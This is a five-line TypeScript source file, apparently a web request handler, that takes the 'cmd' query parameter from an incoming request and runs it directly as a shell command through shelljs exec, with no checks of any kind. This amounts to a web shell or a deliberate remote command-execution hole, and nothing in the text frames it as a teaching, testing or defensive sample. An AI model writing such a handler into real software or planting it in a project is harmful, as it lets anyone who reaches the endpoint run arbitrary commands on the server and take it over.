import { exec } from 'shelljs';
export function h(req: any) {
  const cmd = req.query.cmd;
  exec(cmd);
}
